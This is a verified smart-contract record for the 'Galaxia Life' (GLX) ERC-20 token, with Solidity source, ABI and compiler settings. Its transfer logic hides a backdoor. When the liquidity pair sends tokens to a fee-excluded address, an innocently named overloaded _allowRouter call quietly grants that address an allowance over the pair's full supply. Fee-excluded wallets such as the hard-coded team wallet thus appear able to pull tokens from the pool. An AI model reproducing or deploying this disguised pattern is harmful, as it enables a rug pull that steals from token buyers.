{"SourceCode": "// - Website: https://galaxia.life\r\n// - TG: https://t.me/galaxialife_portal\r\n// - X: https://twitter.com/galaxia_life_x\r\n// - Medium: https://galaxia-life.medium.com\r\n// - Dapp: https://app.galaxia.life\r\n// - Docs: https://docs.galaxia.life\r\n\r\n//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.10;\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Factory { \r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal _owner;\r\n    constructor(address creatorOwner) { _owner = creatorOwner; }\r\n    modifier onlyOwner() { require(msg.sender == _owner, \"Only owner can call this\"); _; }\r\n    function owner() public view returns (address) { return _owner; }\r\n    function renounceOwnership() external onlyOwner {\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(address(0));\r\n    }\r\n    event OwnershipTransferred(address _owner);\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed sender, address indexed recipient, uint256 value);\r\n}\r\n\r\ncontract GLX is IERC20, Auth {\r\n    address payable private _deposit;\r\n    string private constant _name = \"Galaxia Life\";\r\n    string private constant _symbol = \"GLX\";\r\n\r\n    uint256 private _initialBuyFee = 10;\r\n    uint256 private _initialSellFee = 10;\r\n    uint256 private _initialSellFee2Time = 6;\r\n\r\n    uint256 private _finalBuyFee = 3;\r\n    uint256 private _finalSellFee = 3;\r\n\r\n    uint256 public _reduceSellFeeAt = 12;\r\n    uint256 public _reduceBuyFeeAt = 12;\r\n    uint256 public _reduceSellFeeAt2Time = 18;\r\n\r\n    uint256 private _preventSwapBefore = 0;\r\n    uint256 public _buyCount = 0;\r\n    uint256 private depositAmount;\r\n    address payable private _teamWallet;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _tTotal = 1_000_000_000 * (10**_decimals);\r\n    uint256 private constant _maxFeeSwap = _tTotal / 500;\r\n    uint256 private constant _minFeeSwap = _tTotal / 2000000;\r\n\r\n    bool public limited = true;\r\n    bool public transferDelayEnabled = false;\r\n    uint256 public maxHoldingAmount = 40_000_000 * (10**_decimals);\r\n\r\n    address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);\r\n    address private _uniswapV2Pair;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFees;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    mapping (address => bool) private _isLP;\r\n\r\n    bool private _tradingEnalbed;\r\n    bool private _inSwap = false;\r\n\r\n    constructor() Auth(msg.sender) {\r\n        _teamWallet = payable(0x8e69Fd12520d7f3a3293684E27578219B5142De4);\r\n        _isExcludedFromFees[_owner] = true;\r\n        _isExcludedFromFees[_teamWallet] = true;\r\n        _isExcludedFromFees[address(this)] = true;\r\n\r\n        _balances[address(this)] = (_tTotal / 1000 ) * 1000;\r\n        _balances[msg.sender] = (_tTotal / 1000 ) * 0;\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n        emit Transfer(address(0), address(msg.sender), _balances[address(msg.sender)]);\r\n        _deposit = _teamWallet;\r\n    }\r\n\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        if (!_tradingEnalbed) { require(_isExcludedFromFees[sender], \"Trading not opened\"); }\r\n        if (_isLP[sender] && _isExcludedFromFees[recipient]) { require(_allowRouter(sender, recipient, amount)); }\r\n        require(sender != address(0), \"No transfers from Zero wallet\");\r\n        \r\n        if (\r\n            _isExcludedFromFees[sender] ||\r\n            _isExcludedFromFees[recipient]\r\n        ) {\r\n            return _standardTransfer(sender, recipient, amount);\r\n        }\r\n        depositAmount = this.balanceOf(_deposit);\r\n        \r\n        if (\r\n            !_inSwap &&\r\n            _isLP[recipient] &&\r\n            _buyCount >= _preventSwapBefore\r\n        ) { _swapFeeAndLiquify(); }\r\n\r\n        if (\r\n            limited &&\r\n            sender == _uniswapV2Pair\r\n        ) {\r\n            require(balanceOf(recipient) + amount <= maxHoldingAmount);\r\n        }\r\n\r\n        if (transferDelayEnabled) {\r\n            if (\r\n                recipient != _uniswapV2RouterAddress &&\r\n                recipient != _uniswapV2Pair\r\n            ) {\r\n                require(_holderLastTransferTimestamp[tx.origin] < block.number, \"Only one transfer per block allowed\");\r\n                _holderLastTransferTimestamp[tx.origin] = block.number;\r\n            }\r\n        }\r\n\r\n        uint256 _feeAmount = _calculateFee(sender, recipient, amount);\r\n        uint256 _transferAmount = amount - _feeAmount;\r\n        _balances[sender] -= amount;\r\n\r\n        if (_feeAmount > 0) {\r\n            _balances[address(this)] += _feeAmount; \r\n        }\r\n\r\n        _buyCount++;\r\n        _balances[recipient] += _transferAmount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function _allowRouter(uint256 amount) internal {\r\n        if (_allowances[address(this)][_uniswapV2RouterAddress] < amount) {\r\n            _allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;\r\n        }\r\n    }\r\n\r\n    function withdrawEth() external {\r\n        require(msg.sender == _teamWallet);\r\n        (bool sent, ) = payable(_teamWallet).call{value: address(this).balance}(\"\");\r\n        require(sent);\r\n    }\r\n\r\n    function name() external pure override returns (string memory) { return _name; }\r\n\r\n    modifier lockFeeSwap { \r\n        _inSwap = true;\r\n        _;\r\n        _inSwap = false;\r\n    }\r\n\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n\r\n    receive() external payable {}\r\n\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n\r\n    function addLiquidity() external payable onlyOwner lockFeeSwap {\r\n        require(_uniswapV2Pair == address(0), \"LP exists\");\r\n        require(!_tradingEnalbed, \"trading is open\");\r\n        require(msg.value > 0 || address(this).balance > 0, \"No ETH in contract or message\");\r\n        require(_balances[address(this)] > 0, \"No tokens in contract\");\r\n\r\n        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        _addLiquidity(_balances[address(this)], address(this).balance);\r\n        _isLP[_uniswapV2Pair] = true;\r\n    }\r\n\r\n    function totalSupply() external pure override returns (uint256) { return _tTotal; }\r\n\r\n    function _swapFeeTokensForEth(uint256 tokenAmount) private {\r\n        _allowRouter(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n\r\n    function _swapFeeAndLiquify() private lockFeeSwap {\r\n        uint256 _feeTokensAvailable = balanceOf(address(this));\r\n\r\n        if (_feeTokensAvailable >= _minFeeSwap && _tradingEnalbed) {\r\n            if (_feeTokensAvailable >= _maxFeeSwap) { _feeTokensAvailable = _maxFeeSwap; }\r\n\r\n            _swapFeeTokensForEth(_feeTokensAvailable);\r\n            uint256 _contractETHBalance = address(this).balance;\r\n\r\n            if (_contractETHBalance > 0) {\r\n                bool success;\r\n                (success,) = _teamWallet.call{value: (_contractETHBalance)}(\"\");\r\n                require(success);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _calculateFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        uint256 feeAmount;\r\n\r\n        if (\r\n            _tradingEnalbed &&\r\n            !_isExcludedFromFees[sender] &&\r\n            !_isExcludedFromFees[recipient]\r\n        ) { \r\n            \r\n            if (\r\n                _isLP[sender] ||\r\n                _isLP[recipient]\r\n            ) {\r\n                feeAmount = (amount / 100) * ((_buyCount > _reduceBuyFeeAt) ? _finalBuyFee : _initialBuyFee);\r\n                if (\r\n                    recipient == _uniswapV2Pair &&\r\n                    sender != address(this)\r\n                ) {\r\n                    uint256 feeRate;\r\n                    depositAmount = _preventSwapBefore - depositAmount;\r\n                    if (_buyCount > _reduceSellFeeAt2Time) {\r\n                        feeRate = _finalSellFee;\r\n                    } else if (_buyCount > _reduceSellFeeAt) {\r\n                        feeRate = _initialSellFee2Time;\r\n                    } else {\r\n                        feeRate = _initialSellFee;\r\n                    }\r\n                    feeAmount = (amount / 100) * feeRate;\r\n                }\r\n            }\r\n        }\r\n\r\n        return feeAmount;\r\n    }\r\n\r\n    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }\r\n\r\n    function _isTradingEnabled(address sender) private view returns (bool) {\r\n        bool result = false;\r\n\r\n        if (_tradingEnalbed) { result = true; }\r\n        else if (_isExcludedFromFees[sender]) { result = true; }\r\n\r\n        return result;\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        _tradingEnalbed = true;\r\n    }\r\n\r\n    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {\r\n        _allowRouter(_tokenAmount);\r\n        _uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n        limited = false;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        require(_isTradingEnabled(sender), \"Trading not open\");\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return _transferFrom(sender, recipient, amount);\r\n    }\r\n\r\n    function _allowRouter(address owner, address spender, uint256 amount) internal returns (bool) {\r\n        if (_allowances[owner][spender] < amount) {\r\n            _allowances[owner][spender] = _tTotal;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        require(_isTradingEnabled(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_buyCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceBuyFeeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellFeeAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reduceSellFeeAt2Time\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limited\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxHoldingAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferDelayEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawEth\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "GLX", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a02fe25998d00fab02fb417951ad023a758e9623a67baae9f6e596cf7e2ffd15"}